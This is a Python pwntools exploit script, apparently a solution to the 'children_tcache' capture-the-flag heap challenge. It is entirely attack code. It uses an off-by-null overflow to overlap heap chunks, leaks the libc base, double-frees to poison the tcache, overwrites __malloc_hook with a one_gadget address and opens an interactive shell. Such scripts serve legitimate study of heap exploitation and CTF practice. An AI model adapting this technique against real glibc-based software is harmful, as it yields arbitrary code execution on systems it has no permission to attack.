from pwn import *

DEBUG=0

p=process('./children_tcache')
elf=ELF('./libc.so.6')

one_gadget=0x4F322

if DEBUG:
    context.log_level='debug'
    gdb.attach(p)

sd=lambda c : p.send(c)
sl=lambda c : p.sendline(c)
rv=lambda c : p.recvuntil(c)
sla=lambda a,b : p.sendlineafter(a,b)


def new(size,content):
    sla('Your choice: ','1')
    sla('Size:',str(size))
    rv('Data:')
    sd(content)

def show(index):
    sla('Your choice: ','2')
    sla('Index:',str(index))

def delete(index):
    sla('Your choice: ','3')
    sla('Index:',str(index))

def malloc_pwn():
    sla('Your choice: ','1')
    sla('Size:',str(2))

#================================
# leak is the most important part 
# at this exploit

malloc_hook=elf.symbols['__malloc_hook']
log.info('malloc_hook:'+hex(malloc_hook))


new(0x508,'\n')                             #0
new(0x78,'\n')                              #1
new(0x4f8,'\n')                             #2
new(0x78,'\n')                              #3

delete(0)
delete(1)

for i in range(0,9):
    new(0x78-i,(0x78-i)*'a')                #0
    delete(0)


new(0x78,'a'*0x70+p64(0x590))               #0
delete(2)

new(0x508,'\n')                             #1
show(0)


libc_base=u64(p.recv(6)+'\x00'*2)-0x3ebca0
log.info('libc base:'+hex(libc_base))


# now just double free to
# exploit it 

new(0x78,'\n')                              #2
delete(0)
delete(2)

new(0x78,p64(libc_base+malloc_hook))
new(0x78,p64(libc_base+malloc_hook))
new(0x78,p64(libc_base+one_gadget))

malloc_pwn()
p.interactive()


